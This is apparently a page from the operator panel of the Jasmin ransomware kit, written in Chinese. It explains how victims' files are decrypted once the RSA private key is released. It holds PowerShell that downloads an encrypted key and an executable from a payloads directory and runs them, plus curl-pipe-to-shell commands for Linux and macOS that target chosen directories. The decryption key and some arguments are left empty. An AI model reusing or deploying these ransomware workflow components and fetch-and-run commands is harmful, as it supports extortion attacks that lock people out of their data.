解密教程

私钥已AES-256-CBC加密存储，解密命令自动下载加密私钥→内存解密→执行→清理

🖥️ Windows 一键解密

$tmp="$env:TEMP\jasmin_dec"
New-Item -ItemType Directory -Force -Path $tmp | Out-Null
$k=""
Invoke-WebRequest "/payloads/jasmin_private.pem.enc" -OutFile "$tmp\key.enc"
# AES解密私钥
$raw=[Convert]::FromBase64String((Get-Content "$tmp\key.enc" -Raw))
$iv=$raw[0..15]; $ct=$raw[16..($raw.Length-1)]
$aes=[System.Security.Cryptography.Aes]::Create()
$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)
$aes.IV=[byte[]]$iv; $aes.Padding="PKCS7"; $aes.Mode="CBC"
$dec=$aes.CreateDecryptor()
$ms=New-Object IO.MemoryStream(,[byte[]]$ct)
$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
$sr=New-Object IO.StreamReader($cs)
[IO.File]::WriteAllText("$tmp\key.pem",$sr.ReadToEnd())
$sr.Close();$cs.Close();$ms.Close()
# 下载解密器并运行
# 注: 需先将 Jasmin_Decryptor.exe 放入 payloads/ (仓库未附编译产物)
Invoke-WebRequest "/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
& "$tmp\dec.exe" "$tmp\key.pem"
Remove-Item -Recurse -Force $tmp

🐧 Linux 一键解密

# Linux 一键解密 — 纯 openssl，零依赖（无需 pip / cryptography）
# 末尾加上要解密的目录；不写则解密当前目录
curl -sL /payloads/jasmin_unlock.sh | sh -s  "" /path/to/decrypt

# 例：解密 /data 与 /home
curl -sL /payloads/jasmin_unlock.sh | sh -s  "" /data /home

🍎 macOS 一键解密

# macOS 一键解密 — 纯 openssl，零依赖（macOS 自带 openssl，无需安装任何东西）
# 末尾加上要解密的目录；不写则解密当前目录
curl -sL /payloads/jasmin_unlock.sh | sh -s  "" /path/to/decrypt

# 例：解密 /Users 与 /tmp
curl -sL /payloads/jasmin_unlock.sh | sh -s  "" /Users /tmp
准备: 点击「生成RSA密钥对」后，加密私钥(.pem.enc)和解密脚本会自动部署到 payloads/ 目录
